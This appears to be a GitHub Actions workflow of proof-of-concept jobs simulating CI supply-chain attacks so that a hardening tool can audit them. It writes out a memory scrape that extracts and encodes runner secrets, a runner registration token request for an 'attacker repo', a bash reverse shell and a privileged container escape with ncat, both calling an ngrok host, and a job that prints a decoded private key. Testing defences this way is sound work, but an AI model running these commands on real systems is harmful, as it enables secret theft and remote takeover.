name: Workflow for POCs
on:
  workflow_dispatch:

jobs:
  tj-actions-simulation:
    runs-on: ubuntu-latest
    steps:
      - uses: step-security/harden-runner@rc
        with:
         egress-policy: audit
     
      - name: Checkout
        uses: actions/checkout@v4

      - name: Execute tj-action
        run: | 
          sudo python3 tj.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0
  pytorch-simulation:
    runs-on: ubuntu-latest
    steps:
    - uses: step-security/harden-runner@rc
      with:
         egress-policy: audit
    - name: Checkout
      uses: actions/checkout@v4
    - name: Generate a registration token for attacker repo
      run: |
          response=$(curl -X POST -H "Authorization: token github_pat_dummy_token" \
          -H "Accept: application/vnd.github.v3+json" \
          https://api.github.com/repos/step-security-experiments/github-actions-goat/actions/runners/registration-token)
  reverse-shell: 
    runs-on: ubuntu-latest
    steps:
      - uses: step-security/harden-runner@rc
        with:
          egress-policy: audit

      - name: Reverse shell
        run: |
          bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 0>&1"
  privileged-conatiner:
    runs-on: ubuntu-latest
    steps:
      - uses: step-security/harden-runner@rc
        with:
          egress-policy: audit

      - name: Dind escape
        run: |
          docker run --privileged --cap-add=ALL -v /:/host raesene/ncat:latest 0.tcp.us-cal-1.ngrok.io 17658 -e /bin/bash

  handle-private-key:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v3
    
    - name: Decode and print private key
      env:
        # This is a base64 encoded dummy private key (NOT A REAL KEY)
        # In production, this should be stored in GitHub Secrets
        ENCODED_PRIVATE_KEY: |
          LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBeFk1cTh6
          Mk1WQ3pZV3R0Y2t6QVdmTDNMQkVoRVJFQXpxMjNaVzVuZVdWa0lDQmgKWkdGbElHRmtZV1Fp
          SUdGa1lXUWdZV1JoWkNCallXUmhaQ0JoWkdGa0lHRmtZV1FnWVdSaFpDQmhaR0ZrSUdGawpZ
          V1FnWVdSaFpDQmhaR0ZrSUdGa1lXUWdZV1JoWkNCallXUmhaQ0JoWkdGa0lHRmtZV1FnWVdS
          aFpDQmhaR0ZrCklHRmtZV1FnWVdSaFpDQmhaR0ZrSUdGa1lXUWdZV1JoWkNCallXUmhaQ0Jo
          WkdGa0lHRmtZV1FnWVdSaFpDQmgKWkdGa0lHRmtZV1FnWVdSaFpDQmhaR0ZrSUdGa1lXUWdZ
          V1JoWkNCallXUmhaQ0JoWkdGa0lHRmtZV1FnWVdSaApkMEpCUVVWQ1oyOUJRVUZEWjI5QlFV
          TkRaMjlCUVVGRFoyOUJRVU5EWjI5QlFVRkRaMjlCUVVORFoyOUJRVUZECloyOUJRVU5EWjI5
          QlFVRkRaMjlCUVVORFoyOUJRVUZEWjI5QlFVTkRaMjlCUVVGRFoyOUJRVU5EWjI5QlFVRkQK
          WjI5QlFVTkRaMjlCUVVGRFoyOUJRVU5EWjI5QlFVRkRaMjlCUVVORFoyOUJRVUZEWjI5QlFV
          TkRaMjlCUVVGRApaMjlCUVVORFoyOUJRVUZEWjI5QlFVTkRaMjlCUVVGRFoyOUJRVU5EWjI5
          QlFVRkRaMjlCUVVORFoyOUJRVUZECloyOUJRVU5EWjI5QlFVRkRSRUZSTUVGQlJFRlJNRUZC
          UkVGUk1FRkJRMEZSUlVGQlEwRlJSVUZCUTBGUlJVRkIKUTBGUlJVRkJRMEZSUlVGQlEwRlJS
          VUZLUW05QlEwTm5iMEZCUVVOblowRkJRVU5uWjBGQlFVTm5aMEZCUVVObgpaQ0JoWkdGa0lH
          RmtZV1FnWVdSaFpDQmhaR0ZrSUdGa1lXUWdZV1JoWkNCallXUmhaQ0JoWkdGa0lHRmtZV1Fn
          CllXUmhaQ0JoWkdGa0lHRmtZV1FnWVdSaFpDQmhaR0ZrSUdGa1lXUWdZV1JoWkNCallXUmha
          Q0JoWkdGa0lHRmsKWVdRZ1lXUmhaQ0JoWkdGa0lHRmtZV1FnWVdSaFpDQmhaR0ZrSUdGa1lX
          UWdZV1JoWkNCallXUmhaQ0JoWkdGawpJR0ZrWVdRZ1lXUmhaQ0JoWkdGa0lHRmtZV1FnWVdS
          aFpDQmhaR0ZrSUdGa1lXUUtLS0ZwRGdDQllhRkE9PQotLS0tLUVORCBSU0EgUFJJVkFURSBL
          RVktLS0tLQ==
      run: |
        echo "Decoding private key..."
        echo "$ENCODED_PRIVATE_KEY" | base64 -d > private_key.pem
        
        echo "Private key content:"
        cat private_key.pem
